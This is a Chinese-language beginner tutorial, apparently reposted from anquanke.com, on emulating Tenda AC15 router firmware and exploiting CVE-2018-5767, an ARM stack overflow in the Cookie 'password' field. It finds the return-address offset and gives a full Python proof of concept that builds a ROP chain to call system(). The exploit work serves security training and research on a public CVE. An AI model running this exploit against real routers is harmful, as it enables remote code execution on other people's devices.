> 原文链接: https://www.anquanke.com//post/id/204326 


# 写给初学者的IoT实战教程之ARM栈溢出


                                阅读量   
                                **367902**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t015f1265107c20c610.png)](https://p4.ssl.qhimg.com/t015f1265107c20c610.png)



本文面向入门IoT固件分析的安全研究员，以一款ARM路由器漏洞为例详细阐述了分析过程中思路判断，以便读者复现及对相关知识的查漏补缺。

假设读者：了解ARM指令集、栈溢出的基础原理和利用方法、了解IDA、GDB的基础使用方法，但缺少实战漏洞分析经验。

阅读本文后：
1. 可以知道IoT固件仿真的基础方法及排错思路。
1. 可以知道对ARM架构栈溢出漏洞的利用和调试方法。


## 1.实验目标概述

为了便于实验，选择一个可以模拟的路由器固件：Tenda AC15 15.03.1.16_multi。分析的漏洞为CVE-2018-5767，是一个输入验证漏洞，远程攻击者可借助COOKIE包头中特制的‘password’参数利用该漏洞执行代码。

测试环境：Kali 2020 5.4.0-kali3-amd64<br>
固件下载地址：[https://down.tenda.com.cn/uploadfile/AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.zip](https://down.tenda.com.cn/uploadfile/AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.zip)



## 2.固件仿真

首先使用binwalk导出固件文件系统，并通过ELF文件的头信息判断架构，得知为32位小端ARM。

```
binwalk -Me US_AC15V1.0BR_V15.03.1.16_multi_TD01.zip
readelf -h bin/busybox
```

[![](https://p5.ssl.qhimg.com/t01506a79709edc7862.jpg)](https://p5.ssl.qhimg.com/t01506a79709edc7862.jpg)

使用对应的qemu程序（qemu-arm-static），配合chroot启动待分析的目标文件bin/httpd。

```
#安装qemu和arm的动态链接库
sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*
cp $(which qemu-arm-static) .

sudo chroot ./ ./qemu-arm-static ./bin/httpd
```

此时发现卡在了如下图的显示，同时检查80端口也并未开启。

[![](https://p5.ssl.qhimg.com/t01b022ce140adf95af.jpg)](https://p5.ssl.qhimg.com/t01b022ce140adf95af.jpg)

根据打印的信息“/bin/sh: can’t create /proc/sys/kernel/core_pattern: nonexistent directory”，创建相应目录`mkdir -p ./proc/sys/kernel`。同时在ida中通过Strings视图搜索“Welcome to”字符串，通过交叉引用找到程序执行的上下文。

[![](https://p3.ssl.qhimg.com/t01e3bb42cef145ebac.jpg)](https://p3.ssl.qhimg.com/t01e3bb42cef145ebac.jpg)

可以看到有不同的分支方向，简单分析梳理一下分支的判断条件。在上图中的标号1处，执行check_network函数后会检测返回值（保存在R0中），小于等于零时将执行左侧分支。可以观察到会进行sleep并跳回loc_2CF84形成一个循环。

可以猜测因为模拟环境某些元素的缺失导致了检测失败。此处我们对程序进行patch，将其中的比较的指令`MOV R3, R0`修改为`MOV R3, 1`，从而强制让程序进入右侧分支。

借用rasm2工具翻译汇编指令到机器指令，通过IDA原始功能修改即可（展开Edit-Patch program-Change byte进行修改）。

[![](https://p2.ssl.qhimg.com/t013f083b1a85e3a051.jpg)](https://p2.ssl.qhimg.com/t013f083b1a85e3a051.jpg)

[![](https://p3.ssl.qhimg.com/t01418722b6e168152e.jpg)](https://p3.ssl.qhimg.com/t01418722b6e168152e.jpg)

此时运行程序会发现还是会卡住，继续观察上下文代码段，发现在下图中的标号2处对ConnectCfm函数返回值也进行了判断。采取同样的套路进行patch，这里不再赘述。

[![](https://p2.ssl.qhimg.com/t016fdbf06d95c39838.jpg)](https://p2.ssl.qhimg.com/t016fdbf06d95c39838.jpg)

修改完好保存patch文件（展开Edit-Patch program-Apply patches to input file），并再次运行程序。

[![](https://p5.ssl.qhimg.com/t01813c221d2a356908.jpg)](https://p5.ssl.qhimg.com/t01813c221d2a356908.jpg)

[![](https://p3.ssl.qhimg.com/t01c3ac7cd6a04cdaf6.jpg)](https://p3.ssl.qhimg.com/t01c3ac7cd6a04cdaf6.jpg)

可以看到程序打印显示正在监听80端口，但ip地址不对。此时需要我们配置下网络，建立一个虚拟网桥br0，并再次运行程序。

```
sudo apt install uml-utilities bridge-utils
sudo brctl addbr br0
sudo brctl addif br0 eth0
sudo ifconfig br0 up
sudo dhclient br0
```

[![](https://p4.ssl.qhimg.com/t013c7b1218cf4e5f40.jpg)](https://p4.ssl.qhimg.com/t013c7b1218cf4e5f40.jpg)

此时，IP为本机的真实地址，实验环境就配好了。



## 3.漏洞分析

根据CVE的描述以及公开POC的信息，得知溢出点在R7WebsSecurityHandler函数中。ida可以直接按f5反编译arm架构的代码。

[![](https://p3.ssl.qhimg.com/t015f2093df058899a9.jpg)](https://p3.ssl.qhimg.com/t015f2093df058899a9.jpg)

分析后得知，程序首先找到“password=”字符串的位置，通过sscanf函数解析从“=”号到“；”号中间的内容写入v35。这里没有对用户可控的输入进行过滤，从而有机会覆盖堆栈劫持程序流。

为了让程序执行到此处，我们得满足前面的分支条件，见下图：

[![](https://p2.ssl.qhimg.com/t018b4528d674a09609.jpg)](https://p2.ssl.qhimg.com/t018b4528d674a09609.jpg)

我们需要保证请求的url路径不会导致if语句为false，比如“/goform/xxx”就行。

现在进行简单的溢出尝试，开启调试运行程序`sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd`，并另开终端用gdb连上远程调试。

```
gdb-multarch ./bin/httpd
target remote :1234
continue
```

使用python requests库来构造HTTP请求，代码如下：

```
import requests
url = "http://192.168.2.108/goform/xxx"
cookie = `{`"Cookie":"password="+"A"*1000`}`
requests.get(url=url, cookies=cookie)
```

HTTP请求发送后，gdb捕捉到错误。如下图所示，有几项寄存器被写入了“AAAA“。但仔细一看出错的地方并不是函数返回处，而是一个“从不存在的地址取值”造成的报错，这样目前就只能造成拒绝服务，而不能执行命令。

[![](https://p0.ssl.qhimg.com/t019321b3b8c9f2a140.jpg)](https://p0.ssl.qhimg.com/t019321b3b8c9f2a140.jpg)

gdb输入`bt`查看调用路径，跟踪0x0002c5cc,发现位于sub_2C568函数中，而该函数在我们缓冲区溢出后将被执行。

[![](https://p1.ssl.qhimg.com/t015464b6eb803d8f5a.jpg)](https://p1.ssl.qhimg.com/t015464b6eb803d8f5a.jpg)

整理一下，我们想要缓冲区溢出后函数返回以劫持程序流，但现在被中间一个子函数卡住了。观察从溢出点到该子函数中间的这段代码，发现有个机会可以直接跳转到函数末尾。

[![](https://p4.ssl.qhimg.com/t013dd17bf8c47f4aea.jpg)](https://p4.ssl.qhimg.com/t013dd17bf8c47f4aea.jpg)

如上图中的if语句，只要内容为flase就可以达到目的。这段代码寻找“.”号的地址，并通过memcmp函数判断是否为“gif、png、js、css、jpg、jpeg”字符串。比如存在“.png”内容时，`memcmp(v44, "png", 3u)`的返回值为0，if语句将失败。

而这段字符串的读取地址正好位于我们溢出覆盖的栈空间中，所以在payload的尾部部分加入该内容即可。于此同时，我们使用cyclic来帮助判断到返回地址处的偏移量。

```
import requests
url = "http://192.168.2.108/goform/xxx"
cookie = `{`"Cookie":"password="+"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae"+ ".png"`}`
requests.get(url=url, cookies=cookie)
```

崩溃信息如下图所示。

[![](https://p2.ssl.qhimg.com/t018efe9ac9a6887e55.jpg)](https://p2.ssl.qhimg.com/t018efe9ac9a6887e55.jpg)

**需要特别注意**，崩溃的返回地址显示是0x6561616c(‘laae’)，我们还需要观察CPSR寄存器的T位进行判断，CPSR寄存器的标志位如下图所示。

[![](https://p1.ssl.qhimg.com/t01d4ea3a74796c9ae6.jpg)](https://p1.ssl.qhimg.com/t01d4ea3a74796c9ae6.jpg)

这里涉及到ARM模式（LSB=0）和Thumb模式（LSB=1）的切换，栈上内容弹出到PC寄存器时，其最低有效位（LSB）将被写入CPSR寄存器的T位，而PC本身的LSB被设置为0。此时在gdb中执行`p/t $cpsr`以二进制格式显示CPSR寄存器。如下图所示，发现T位值为1，因此需要在之前报错的地址上加一还原为0x6561616f(‘maae’)。

[![](https://p1.ssl.qhimg.com/t01a071dd39eb6f0bf2.jpg)](https://p1.ssl.qhimg.com/t01a071dd39eb6f0bf2.jpg)

在我看到的几篇该漏洞分析文章都忽略了这一点导致得到错误偏移量。我们可以在函数最后返回的pop指令处（0x2ed18）下断点进行辅助判断。如下图所示，可以看到PC原本将被赋值为“maae”。因此偏移量为448。

[![](https://p4.ssl.qhimg.com/t01b8f4c71428fe968e.jpg)](https://p4.ssl.qhimg.com/t01b8f4c71428fe968e.jpg)



## 4.漏洞利用

[![](https://p3.ssl.qhimg.com/t01504af0a09359ba02.jpg)](https://p3.ssl.qhimg.com/t01504af0a09359ba02.jpg)

如上图所示，用checksec检查发现程序开启了NX保护，无法直接执行栈中的shellcode，我们使用ROP技术来绕过NX。

大多数程序都会加载使用libc.so动态库中的函数，因此可以利用libc.so中的system函数和一些指令片断（通常称为gadget）来共同实现代码执行。需要以下信息：
1. 将system函数地址写入某寄存器的gadget；
1. 往R0寄存器存入内容（即system函数的参数），并跳转到system函数地址的gadget；
1. libc.so的基地址；
1. system函数在libc中的偏移地址；
这里我们假设关闭了ASLR，libc.so基地址不会发生变化。通过gdb中执行`vmmap`查看当前libc.so的加载地址（带执行权限的那一项，注意该值在每台机器上可能都不同，我的为0xff5d5000），如下图：

[![](https://p0.ssl.qhimg.com/t0175c5d1d1b622953c.jpg)](https://p0.ssl.qhimg.com/t0175c5d1d1b622953c.jpg)

system函数的偏移地址读取libc.so文件的符号表，命令为：`readelf -s ./lib/libc.so.0 | grep system`，得到0x0005a270。

[![](https://p3.ssl.qhimg.com/t01e3bb42cef145ebac.jpg)](https://p3.ssl.qhimg.com/t01e3bb42cef145ebac.jpg)

接着寻找控制R0的指令片断：

```
sudo pip3 install ropgadget

ROPgadget --binary ./lib/libc.so.0  | grep "mov r0, sp"
0x00040cb8 : mov r0, sp ; blx r3
```

这条指令会将栈顶写入R0，并跳转到R3寄存器中的地址。因此再找一条可以写R3的指令即可：

```
ROPgadget --binary ./lib/libc.so.0 --only "pop"| grep r3
0x00018298 : pop `{`r3, pc`}`
```

最终payload格式为：[offset, gadget1, system_addr, gadget2, cmd] ，流程如下：
1. 溢出处函数返回跳转到第一个gadget1（pop `{`r3, pc`}`）；
1. 栈顶第一个元素（system_addr）弹出到R3寄存器，第二个元素(gadget2：mov r0, sp ; blx r3`}`)弹出到PC，使程序流执行到gadget2；
1. 此时的栈顶内容（cmd）放入R0寄存器，并使程序跳转到R3寄存器指向的地址去执行。
整理得到以下POC：

```
import requests
from pwn import *

cmd="echo hello"
libc_base = 0xff5d5000
system_offset = 0x0005a270
system_addr = libc_base + system_offset
gadget1 = libc_base + 0x00018298
gadget2 = libc_base + 0x00040cb8

#444个“A”和“.png”组成偏移量448
payload = "A"*444 +".png" + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd

url = "http://192.168.2.108/goform/xxx"
cookie = `{`"Cookie":"password="+payload`}`
requests.get(url=url, cookies=cookie)
```

我们可以在gadget2中将要跳转到system函数时设下断点，观察寄存器的状态。如下图所示，R0中内容为“echo hello”作为参数，R3中保存有system函数的地址，当前指令执行后将执行`system("echo hello")`。

[![](https://p0.ssl.qhimg.com/t0102e310cb6e38ea14.jpg)](https://p0.ssl.qhimg.com/t0102e310cb6e38ea14.jpg)

继续运行将看到命令被执行。

[![](https://p4.ssl.qhimg.com/t0114482edeb2ca65b0.jpg)](https://p4.ssl.qhimg.com/t0114482edeb2ca65b0.jpg)



## 参考
1. [https://xz.aliyun.com/t/7357](https://xz.aliyun.com/t/7357)
1. [https://wzt.ac.cn/2019/03/19/CVE-2018-5767/#&amp;gid=1&amp;pid=12](https://wzt.ac.cn/2019/03/19/CVE-2018-5767/#&amp;gid=1&amp;pid=12)
1. [https://www.freebuf.com/articles/wireless/166869.html](https://www.freebuf.com/articles/wireless/166869.html)
1. [https://www.exploit-db.com/exploits/44253](https://www.exploit-db.com/exploits/44253)